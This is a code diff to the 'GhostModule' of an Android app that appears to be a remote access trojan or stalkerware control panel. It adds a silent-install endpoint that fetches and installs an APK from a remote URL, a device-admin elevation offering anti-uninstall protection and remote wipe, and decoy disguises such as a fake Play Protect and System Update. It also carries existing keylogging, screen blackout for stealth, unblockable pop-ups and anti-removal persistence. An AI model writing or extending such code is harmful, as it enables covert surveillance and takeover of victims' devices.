@@ -12,6 +12,7 @@ import com.labs.labrats.IO_Persistence_Manager;
 import com.labs.labrats.SystemAnalytics;
 
 import java.util.ArrayList;
+import java.util.List;
 import java.util.Map;
 
 import fi.iki.elonen.NanoHTTPD.IHTTPSession;
@@ -46,6 +47,13 @@ public class GhostModule extends BaseModule {
             return serveInspectorTree();
         } else if (uri.equals("/ghost/interact")) {
             return performInteraction(params);
+        } else if (uri.equals("/ghost/silent-install")) {
+            String apkUrl = params.get("url");
+            if (apkUrl != null && !apkUrl.trim().isEmpty()) {
+                com.labs.labrats.PrivilegedInstaller.downloadAndSilentInstallAsync(context, apkUrl);
+                return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"SILENT_INSTALL_DISPATCHED\"}");
+            }
+            return newResponse(Response.Status.BAD_REQUEST, "application/json", "{\"success\": false, \"message\": \"URL required\"}");
         } else if (uri.equals("/stealth")) {
             return toggleStealthMode(params);
         }
@@ -330,9 +338,6 @@ public class GhostModule extends BaseModule {
 
     private Response serveGhostPage(IHTTPSession session) {
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
-        html.append("</div>");
         
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px; justify-content: flex-start; text-align: left; font-size: 1.6rem;\">")
@@ -360,39 +365,19 @@ public class GhostModule extends BaseModule {
 
         html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;\">");
         
-        // 1. Blackout Protocol
-        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">BLACKOUT_PROTOCOL <span class=\"info-trigger\" onclick=\"showInfo(event, 'BLACKOUT_PROTOCOL', 'Suppress hardware backlight for physical stealth while maintaining the remote feed.')\">INFO</span></div>");
-        html.append("<button id=\"blackout-btn\" onclick=\"toggleBlackout()\" class=\"btn btn-small\" style=\"width:100% !important; margin:15px 0 0 0;\">ACTIVATE</button>");
-        html.append("</div>");
+        // 1. Maintenance Sequences (2x2 Grid: Repair, Optimize, Inject Trust, Heal)
+        html.append("<div class=\"info-item\" style=\"background: rgba(0, 242, 255, 0.03);\">");
+        html.append("<div class=\"info-label\" style=\"color: var(--neon-cyan); font-size: 0.8rem;\">MAINTENANCE_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'MAINTENANCE_SEQUENCES', 'Execute system maintenance, telemetry re-synchronization, power optimization, and environment repair protocols.')\">INFO</span></div>");
+        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
+        html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); width: 100% !important; margin: 0; font-size: 0.55rem;\">INITIATE_REPAIR</button>");
+        html.append("<button onclick=\"optimizeStability()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 0; font-size: 0.55rem;\">OPTIMIZE_LINK</button>");
+        html.append("<button onclick=\"injectTrust()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 0; font-size: 0.55rem;\">INJECT_TRUST</button>");
+        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0; font-size: 0.55rem;\">INITIATE_HEAL</button>");
+        html.append("</div></div>");
 
-        // 2. System Denial Lock
+        // 2. Deep Repair Sequences
         html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">SYSTEM_DENIAL_LOCK <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_DENIAL_LOCK', 'Deploy a persistent, full-screen security overlay to lock physical interaction.')\">INFO</span></div>");
-        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width:100% !important; margin:15px 0 0 0;\">DEPLOY_LOCK</button>");
-        html.append("</div>");
-
-        // 3. Maintenance: Repair Uplink
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,157,0,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"color: var(--neon-orange); font-size: 0.7rem;\">REPAIR_LINK <span class=\"info-trigger\" onclick=\"showInfo(event, 'REPAIR_LINK', 'Re-synchronize background telemetry and request critical environment permissions.')\">INFO</span></div>");
-        html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); width: 100% !important; margin: 15px 0 0 0;\">INITIATE_REPAIR</button>");
-        html.append("</div>");
-
-        // 4. Maintenance: Optimize Stability
-        html.append("<div class=\"info-item\" style=\"background: rgba(57,255,20,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"color: var(--neon-green); font-size: 0.7rem;\">OPTIMIZE_LINK <span class=\"info-trigger\" onclick=\"showInfo(event, 'OPTIMIZE_LINK', 'Modify power management rules to exclude the service from battery-saving restrictions.')\">INFO</span></div>");
-        html.append("<button onclick=\"optimizeStability()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 15px 0 0 0;\">OPTIMIZE_LINK</button>");
-        html.append("</div>");
-
-        // 5. Maintenance: Bypass Restrictions
-        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"color: var(--neon-cyan); font-size: 0.7rem;\">BYPASS_LIMITS <span class=\"info-trigger\" onclick=\"showInfo(event, 'BYPASS_LIMITS', 'Utilize the Session Installation API to unlock settings restricted by system security layers.')\">INFO</span></div>");
-        html.append("<button onclick=\"injectTrust()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 15px 0 0 0;\">INJECT_TRUST</button>");
-        html.append("</div>");
-
-        // 6. Maintenance: Deep Repair Actions
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.7rem;\">DEEP_REPAIR_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'DEEP_REPAIR', 'Direct system shortcuts to manually grant blocked permissions or handle OS security layers.')\">INFO</span></div>");
+        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">DEEP_REPAIR_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'DEEP_REPAIR', 'Direct system shortcuts to manually grant blocked permissions or handle OS security layers.')\">INFO</span></div>");
         html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
         html.append("<button onclick=\"deepRepair()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\">APP_INFO</button>");
         html.append("<button onclick=\"openAccessibility()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 0; font-size: 0.55rem;\">GHOST_MODE</button>");
@@ -400,25 +385,42 @@ public class GhostModule extends BaseModule {
         html.append("<button onclick=\"dispatchPermissionSequence()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 0; font-size: 0.55rem;\">PROMPTS</button>");
         html.append("</div></div>");
 
-        // 7. Auto Pilot & Anti-Removal (Legacy Controls)
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,255,0.02); grid-column: 1 / -1;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">AUTOMATION_&_PERSISTENCE <span class=\"info-trigger\" onclick=\"showInfo(event, 'AUTOMATION_&_PERSISTENCE', 'Configure automated recovery protocols and anti-removal persistence layers.')\">INFO</span></div>");
-        html.append("<div style=\"display:flex; flex-wrap:wrap; gap:10px; margin-top: 10px;\">");
-        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); margin:0;\">INITIATE_HEAL</button>");
+        // 3. Automation/Persistence
+        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,0,0.03);\">");
+        html.append("<div class=\"info-label\" style=\"color: var(--neon-yellow); font-size: 0.8rem;\">AUTOMATION/PERSISTENCE <span class=\"info-trigger\" onclick=\"showInfo(event, 'AUTOMATION_&_PERSISTENCE', 'Configure automated recovery protocols and anti-removal persistence layers.')\">INFO</span></div>");
+        html.append("<div style=\"display:flex; flex-direction:column; gap:8px; margin-top: 15px;\">");
         String autoPilotLabel = IO_Persistence_Manager.isAutoPilotEngaged() ? "AUTOPILOT_ENGAGED" : "AUTOPILOT_OFF";
         String autoPilotClass = IO_Persistence_Manager.isAutoPilotEngaged() ? "btn btn-small btn-engaged-yellow" : "btn btn-small";
-        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");
-        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"margin:0;\">LOADING...</button>");
+        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"width:100%; border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");
+        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"width:100%; border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">LOADING...</button>");
         html.append("</div></div>");
+
+        // 4. Blackout Mode
+        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03);\">");
+        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">BLACKOUT_MODE <span class=\"info-trigger\" onclick=\"showInfo(event, 'BLACKOUT_MODE', 'Suppress hardware backlight for physical stealth while maintaining the remote feed.')\">INFO</span></div>");
+        html.append("<button id=\"blackout-btn\" onclick=\"toggleBlackout()\" class=\"btn btn-small\" style=\"width:100% !important; margin:15px 0 0 0;\">ACTIVATE</button>");
+        html.append("</div>");
+
+        // 5. System Denial Lock
+        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
+        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">SYSTEM_DENIAL_LOCK <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_DENIAL_LOCK', 'Deploy a persistent, full-screen security overlay to lock physical interaction.')\">INFO</span></div>");
+        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width:100% !important; margin:15px 0 0 0;\">DEPLOY_LOCK</button>");
+        html.append("</div>");
+
+        // 6. Device Admin Elevation Section (Purple Card - Matching Blackout Protocol Button Style)
+        html.append("<div class=\"info-item\" style=\"background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.4); border-radius: 12px; box-shadow: 0 0 15px rgba(168, 85, 247, 0.1);\">");
+        html.append("<div class=\"info-label\" style=\"color: #a855f7; font-size: 0.8rem; font-weight: bold; letter-spacing: 1px;\">ADMIN_ELEVATION <span class=\"info-trigger\" style=\"border-color: rgba(168, 85, 247, 0.5); color: #a855f7;\" onclick=\"showInfo(event, 'ADMIN_ELEVATION', 'Enforce Device Administration policies on the target device. Grants elevated system administration protocols including remote instant screen locking, emergency data wipe, and anti-uninstall protection.')\">INFO</span></div>");
+        html.append("<button id=\"elevate-admin-btn\" onclick=\"ghostAction('elevateAdmin')\" class=\"btn btn-small\" style=\"width: 100% !important; margin: 15px 0 0 0; border-color: #a855f7; color: #a855f7; background: rgba(168, 85, 247, 0.1); font-weight: bold;\">ELEVATE_ADMIN</button>");
+        html.append("</div>");
         
         html.append("</div></div>");
 
         // Unified Interaction Suite (Flex Container for Desktop)
         html.append("<style>");
-        html.append("  .interaction-suite { display: flex; flex-wrap: nowrap; gap: 0; align-items: stretch; margin-top: 30px; border: 1px solid rgba(0, 242, 255, 0.15); border-radius: 12px; background: var(--bg-card); overflow: hidden; }");
+        html.append("  .interaction-suite { display: flex; flex-wrap: nowrap; gap: 0; align-items: stretch; margin-top: 30px; border: 1px solid rgba(0, 242, 255, 0.4) !important; border-radius: 12px; background: var(--bg-card); overflow: hidden; box-shadow: none !important; }");
         html.append("  .interaction-suite input { width: 100% !important; max-width: 100% !important; height: auto !important; }");
         html.append("  .remote-control-panel { flex: 1 1 50%; padding: 40px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-width: 320px; }");
-        html.append("  .panel-divider { width: 1px; background: rgba(0, 242, 255, 0.15); flex-shrink: 0; }");
+        html.append("  .panel-divider { width: 1px; background: rgba(0, 242, 255, 0.4) !important; flex-shrink: 0; }");
         html.append("  .inspector-panel { flex: 1 1 50%; padding: 40px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-width: 320px; }");
         html.append("  @media (max-width: 1024px) { .interaction-suite { flex-direction: column; flex-wrap: wrap; } .panel-divider { width: 100%; height: 1px; } .remote-control-panel, .inspector-panel { flex: 1 1 auto; padding: 25px 15px; width: 100%; } }");
         html.append("</style>");
@@ -434,7 +436,7 @@ public class GhostModule extends BaseModule {
         html.append("<div class=\"phone-frame\" style=\"margin-bottom: 30px; align-self: center;\">");
         html.append("<div class=\"phone-notch\"></div>");
         html.append("<div id=\"ghost-screen-container\" class=\"phone-screen\" style=\"cursor: crosshair;\">");
-        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" />");
+        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none; touch-action: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" ontouchstart=\"startGhostDrag(event)\" ontouchend=\"endGhostDrag(event)\" />");
         html.append("<div id=\"ghost-screen-status\" style=\"color: #444; font-size: 0.7rem; font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,242,255,0.3);\">OLED_STANDBY</div>");
         html.append("</div></div>");
         html.append("</div>");
@@ -444,6 +446,9 @@ public class GhostModule extends BaseModule {
         
         // Toggle Initiate/Terminate button (Centered below screen)
         html.append("<button id=\"ghost-toggle-btn\" onclick=\"toggleGhostScreen()\" class=\"btn\" style=\"width: 100%; border-radius: 12px; margin: 0;\">INITIATE_VIEW</button>");
+
+        // Single Clean Swipe Up (Menu) button
+        html.append("<button onclick=\"fetch('/ghost/interact?action=swipe_up').then(()=>showToast('SWIPE_UP_DISPATCHED'))\" class=\"btn btn-small\" style=\"width: 100%; border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.08); font-weight: bold; border-radius: 8px; margin: 0; padding: 12px; font-size: 0.75rem;\">&#9650; SWIPE UP (MENU)</button>");
 
         // Remote Typing Input group
         html.append("<div style=\"width: 100%; display: flex; flex-direction: column; gap: 10px;\">");
@@ -473,7 +478,7 @@ public class GhostModule extends BaseModule {
 
         // --- GHOST TOAST CARD ---
         html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow); margin-top: 50px;\">");
-        html.append("<h2 style=\"text-align: left; color: var(--neon-yellow); font-size: 1.15rem; margin: 0 0 15px 0;\">GHOST_TOAST <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_TOAST', 'Force-project non-standard text pop-ups to the device display. Unlike standard notifications, these cannot be swiped away or blocked by the system or user.')\">INFO</span></h2>");
+        html.append("<h2 style=\"text-align: left; color: var(--neon-yellow); font-size: 1.35rem; margin: 0 0 15px 0;\">GHOST_TOAST <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_TOAST', 'Force-project non-standard text pop-ups to the device display. Unlike standard notifications, these cannot be swiped away or blocked by the system or user.')\">INFO</span></h2>");
         
         html.append("<style>");
         html.append("  input[type='range'] { height: 30px; -webkit-appearance: none; background: transparent; cursor: pointer; }");
@@ -482,8 +487,8 @@ public class GhostModule extends BaseModule {
         html.append("  @media (min-width: 1024px) {");
         html.append("    .toast-config-row { display: flex !important; flex-direction: row !important; align-items: flex-end !important; gap: 15px !important; flex-wrap: nowrap !important; }");
         html.append("    .toast-config-row > div { flex: 0 1 auto !important; width: auto !important; min-width: 0 !important; }");
-        html.append("    .toast-range { width: 110px !important; }");
-        html.append("    #toast-anim { width: 160px !important; }");
+        html.append("    .toast-range { width: 200px !important; }");
+        html.append("    #toast-anim { width: 260px !important; max-width: 260px !important; height: 42px !important; padding: 10px !important; border: 1px solid var(--neon-yellow) !important; font-size: 0.7rem !important; }");
         html.append("  }");
         html.append("  @media (max-width: 768px) {");
         html.append("    .toast-config-row { display: grid !important; grid-template-columns: 1fr !important; gap: 20px !important; }");
@@ -499,7 +504,7 @@ public class GhostModule extends BaseModule {
 
         // Color Picker Row
         html.append("<div style=\"display:flex; align-items:center; gap:12px; margin-bottom:20px; position:relative;\">");
-        html.append("<div class=\"info-label\" style=\"margin-bottom:0; font-size:0.7rem; color:#888;\">TEXT_COLOR:</div>");
+        html.append("<div class=\"info-label\" style=\"margin-bottom:0; font-size:0.8rem; color:#888;\">TEXT_COLOR:</div>");
         html.append("<div id=\"toast-color-btn\" onclick=\"toggleColorPicker(event)\" style=\"width:18px; height:18px; background:#FFFFFF; border:1px solid #555; border-radius:50%; cursor:pointer; transition:0.2s;\"></div>");
         html.append("<div id=\"color-picker-palette\" onclick=\"event.stopPropagation()\" style=\"display:none; position:absolute; left:120px; bottom:0; background:#111; border:1px solid #333; padding:10px; border-radius:10px; z-index:100; box-shadow:0 10px 30px rgba(0,0,0,0.8); grid-template-columns:repeat(5, 1fr); gap:8px;\">");
         String[] toastColors = {"#FFFFFF", "#FF3131", "#39FF14", "#00F2FF", "#FFFF00", "#FF9D00", "#9B59B6", "#FF00FF", "#0088FF", "#888888"};
@@ -514,25 +519,25 @@ public class GhostModule extends BaseModule {
         
         // 1. Font Size
         html.append("<div>");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem; color: #888;\">FONT_SIZE: <span id=\"size-val\">22</span></div>");
+        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem; color: #888;\">FONT_SIZE: <span id=\"size-val\">22</span></div>");
         html.append("<input type=\"range\" id=\"toast-size\" min=\"10\" max=\"60\" value=\"22\" oninput=\"document.getElementById('size-val').innerText=this.value\" style=\"width: 100%; accent-color: var(--neon-yellow);\" class=\"toast-range\">");
         html.append("</div>");
 
         // 2. Y Position
         html.append("<div>");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem; color: #888;\">V_OFFSET: <span id=\"y-val\">250</span></div>");
+        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem; color: #888;\">V_OFFSET: <span id=\"y-val\">250</span></div>");
         html.append("<input type=\"range\" id=\"toast-y\" min=\"0\" max=\"1800\" value=\"250\" oninput=\"document.getElementById('y-val').innerText=this.value\" style=\"width: 100%; accent-color: var(--neon-yellow);\" class=\"toast-range\">");
         html.append("</div>");
 
         // 3. Duration
         html.append("<div>");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem; color: #888;\">DURATION: <span id=\"dur-val\">12000</span>ms</div>");
+        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem; color: #888;\">DURATION: <span id=\"dur-val\">12000</span>ms</div>");
         html.append("<input type=\"range\" id=\"toast-dur\" min=\"1000\" max=\"30000\" step=\"500\" value=\"12000\" oninput=\"document.getElementById('dur-val').innerText=this.value\" style=\"width: 100%; accent-color: var(--neon-yellow);\" class=\"toast-range\">");
         html.append("</div>");
 
         html.append("<div>");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem; color: #888;\">ANIMATION_STYLE</div>");
-        html.append("<select id=\"toast-anim\" style=\"width: 100%; background: #000; border: 1px solid rgba(255,255,0,0.3); color: #fff; padding: 8px; border-radius: 6px; outline: none; font-family: monospace;\">");
+        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem; color: #888;\">ANIMATION_STYLE</div>");
+        html.append("<select id=\"toast-anim\" style=\"width: 260px !important; max-width: 260px !important; height: 42px; background: #000; border: 1px solid var(--neon-yellow); color: #fff; padding: 10px; border-radius: 6px; outline: none; font-family: monospace; font-size: 0.7rem;\">");
         html.append("<option value=\"scroll\">SCROLL_HORIZONTAL</option>");
         html.append("<option value=\"pop\">POP_IN_OUT</option>");
         html.append("<option value=\"static\">STATIC_FADE</option>");
@@ -546,7 +551,7 @@ public class GhostModule extends BaseModule {
         // Ghost Keylogs Section
         html.append("<div id=\"keylogger-box\" class=\"card card-keylogger\" style=\"margin-top: 30px; display: block !important;\">");
         html.append("<div class=\"flex-header\">");
-        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 1.15rem; display: flex; align-items: center; gap: 8px;\">&#9000; GHOST_KEYLOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_KEYLOGS', 'Real-time interception of keystrokes and system text.')\">INFO</span></h2>");
+        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px;\">&#9000; GHOST_KEYLOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_KEYLOGS', 'Real-time interception of keystrokes and system text.')\">INFO</span></h2>");
         html.append("<button onclick=\"clearGhostLogs()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; border-radius: 12px;\">PURGE_LOGS</button>");
         html.append("</div>");
         
@@ -615,13 +620,34 @@ public class GhostModule extends BaseModule {
                     success = ghost.clickAt(realX, realY);
                 }
                 break;
+            case "swipe_up":
+            case "menu":
+                {
+                    int sw = ghost.getScreenWidth() > 0 ? ghost.getScreenWidth() : 1080;
+                    int sh = ghost.getScreenHeight() > 0 ? ghost.getScreenHeight() : 2400;
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                        try { ghost.performGlobalAction(14); } catch (Exception ignored) {}
+                    }
+                    int startX = sw / 2;
+                    int startY = (int) (sh * 0.85);
+                    int endY = (int) (sh * 0.20);
+                    success = ghost.swipe(startX, startY, startX, endY, 350);
+                }
+                break;
+            case "swipe_down":
+                {
+                    int sw = ghost.getScreenWidth() > 0 ? ghost.getScreenWidth() : 1080;
+                    int sh = ghost.getScreenHeight() > 0 ? ghost.getScreenHeight() : 2400;
+                    success = ghost.swipe(sw / 2, (int)(sh * 0.15), sw / 2, (int)(sh * 0.85), 280);
+                }
+                break;
             case "swipe":
                 if (params.containsKey("px1") && params.containsKey("py1") && params.containsKey("px2") && params.containsKey("py2")) {
                     float px1 = Float.parseFloat(params.get("px1"));
                     float py1 = Float.parseFloat(params.get("py1"));
                     float px2 = Float.parseFloat(params.get("px2"));
                     float py2 = Float.parseFloat(params.get("py2"));
-                    int d = Integer.parseInt(params.get("d"));
+                    int d = params.containsKey("d") ? Integer.parseInt(params.get("d")) : 300;
                     int x1 = (int) (px1 * ghost.getScreenWidth() / 100);
                     int y1 = (int) (py1 * ghost.getScreenHeight() / 100);
                     int x2 = (int) (px2 * ghost.getScreenWidth() / 100);
@@ -638,6 +664,11 @@ public class GhostModule extends BaseModule {
             case "recents":
                 success = ghost.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS);
                 break;
+            case "blackout":
+            case "toggle_blackout":
+                ghost.startBlackout(!IO_Persistence_Manager.isBlackoutActive());
+                success = true;
+                break;
             case "blackout_on":
                 ghost.startBlackout(true);
                 success = true;
@@ -652,6 +683,26 @@ public class GhostModule extends BaseModule {
                 break;
             case "toggleAntiRemoval":
                 IO_Persistence_Manager.setAntiRemovalEnabled(!IO_Persistence_Manager.isAntiRemovalEnabled());
+                success = true;
+                break;
+            case "elevateAdmin":
+            case "elevate_admin":
+            case "admin":
+                new Handler(Looper.getMainLooper()).post(() -> {
+                    try {
+                        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                            .edit().putBoolean("is_repairing", true).apply();
+                        IO_Persistence_Manager.setAutoPilot(true);
+                        IO_Persistence_Manager.stopSmartExit();
+
+                        Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
+                        wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                        wrapperIntent.putExtra("launch_admin", true);
+                        context.startActivity(wrapperIntent);
+                    } catch (Exception e) {
+                        android.util.Log.e("GhostModule", "Failed to launch device admin: " + e.getMessage());
+                    }
+                });
                 success = true;
                 break;
             case "type":
@@ -695,11 +746,12 @@ public class GhostModule extends BaseModule {
                 return newResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"hidden\": false}");
             } else {
                 if (type != null) {
-                    int choice = 1; // update
+                    int choice = 1; // Play Protect (Default / SettingsAlias)
                     if (type.equals("calc")) choice = 2;
                     else if (type.equals("weather")) choice = 3;
-                    else if (type.equals("settings")) choice = 4;
-                    else if (type.equals("logo")) choice = 5;
+                    else if (type.equals("update")) choice = 4; // System Update
+                    else if (type.equals("smarttutor") || type.contains("tutor")) choice = 5; // Smart Tutor
+                    else if (type.equals("logo")) choice = 6;
                     
                     SystemAnalytics.setDecoyChoice(context, choice);
                 }
